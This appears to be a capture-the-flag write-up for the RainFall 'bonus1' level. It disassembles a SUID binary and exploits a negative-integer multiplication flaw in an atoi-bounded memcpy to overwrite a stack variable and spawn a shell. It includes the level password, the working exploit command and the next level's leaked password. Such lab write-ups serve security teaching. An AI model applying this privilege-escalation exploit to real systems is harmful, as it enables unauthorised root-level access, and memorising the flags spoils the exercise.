login as the user `bonus1`

```shell
 ssh -p 4242 bonus1@10.13.100.31
bonus1@10.13.100.31's password: cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
  GCC stack protector support:            Enabled
  Strict user copy checks:                Disabled
  Restrict /dev/mem access:               Enabled
  Restrict /dev/kmem access:              Enabled
  grsecurity / PaX: No GRKERNSEC
  Kernel Heap Hardening: No KERNHEAP
 System-wide ASLR (kernel.randomize_va_space): Off (Setting: 0)
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/bonus1/bonus1
```

a `SUID` exactable file is locates in the home directory


```gdb
(gdb) disas main
Dump of assembler code for function main:
   0x08048424 <+0>:     push   %ebp
   0x08048425 <+1>:     mov    %esp,%ebp
   0x08048427 <+3>:     and    $0xfffffff0,%esp
   0x0804842a <+6>:     sub    $0x40,%esp
   0x0804842d <+9>:     mov    0xc(%ebp),%eax
   0x08048430 <+12>:    add    $0x4,%eax
   0x08048433 <+15>:    mov    (%eax),%eax
   0x08048435 <+17>:    mov    %eax,(%esp)
   0x08048438 <+20>:    call   0x8048360 <atoi@plt>
   0x0804843d <+25>:    mov    %eax,0x3c(%esp)
   0x08048441 <+29>:    cmpl   $0x9,0x3c(%esp)
   0x08048446 <+34>:    jle    0x804844f <main+43>
   0x08048448 <+36>:    mov    $0x1,%eax
   0x0804844d <+41>:    jmp    0x80484a3 <main+127>
   0x0804844f <+43>:    mov    0x3c(%esp),%eax
   0x08048453 <+47>:    lea    0x0(,%eax,4),%ecx
   0x0804845a <+54>:    mov    0xc(%ebp),%eax
   0x0804845d <+57>:    add    $0x8,%eax
   0x08048460 <+60>:    mov    (%eax),%eax
   0x08048462 <+62>:    mov    %eax,%edx
   0x08048464 <+64>:    lea    0x14(%esp),%eax
   0x08048468 <+68>:    mov    %ecx,0x8(%esp)
   0x0804846c <+72>:    mov    %edx,0x4(%esp)
   0x08048470 <+76>:    mov    %eax,(%esp)
   0x08048473 <+79>:    call   0x8048320 <memcpy@plt>
   0x08048478 <+84>:    cmpl   $0x574f4c46,0x3c(%esp)
   0x08048480 <+92>:    jne    0x804849e <main+122>
   0x08048482 <+94>:    movl   $0x0,0x8(%esp)
   0x0804848a <+102>:   movl   $0x8048580,0x4(%esp)
   0x08048492 <+110>:   movl   $0x8048583,(%esp)
   0x08048499 <+117>:   call   0x8048350 <execl@plt>
   0x0804849e <+122>:   mov    $0x0,%eax
   0x080484a3 <+127>:   leave
   0x080484a4 <+128>:   ret
End of assembler dump.
(gdb) x/s 0x8048583
0x8048583:       "/bin/sh"
(gdb) p 0x574f4c46
$1 = 1464814662
```

after inspecting the program we find that it accepts 2 arguments
then it passes the first argument to `atoi` and stored in a variable in the stack.
the second is copied into a buffer of size `40` in the stack using `memcpy`, the number of copied bytes are the value returned by `atoi` * 4.

the program checks of the return of `atoi` is greater then `9` this leads to a `memcpy` with a maximum size of 36 bytes preventing a stack overflow to occur.

if the return of `atoi` matches the value `0x574f4c46` a new shell is spawned in the current process using `execl`.


the program accepts any integer value as the first argument, as long as it is greater than `10`. but it dose not check for negative values.
so passing `-1` to the program will result to passing `0xffffffff * 4 = (0xffffffff * 4) % 4294967296 = 4294967292` as the copy size of `memcpy`.



we have a `40` byte buffer in the stack and next to it in the location of out passed integer value (the return of `atoi`), we need to change the integer value so that we can spawn a shell.

we will need the copy size of `memcpy` to resolve to `44`,

```rust
let a = 10000000 00000000 00000000 00001011 (Base 2) == -2147483637 (Base 10)
a <<= 2 || a *= 4
a == 00000000 00000000 00000000 00101100 (Base 2) == 44 (Base 10)
```

now we just need to pass in a random 40 byte buffer and append it with out desired value to override the integer stored location

```shell
bonus1@RainFall:~$ ./bonus1 -2147483637 `python -c "print 'A' * 40 + '\x46\x4c\x4f\x57'"`
$ cat /home/user/bonus2/.pass
579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
$
```
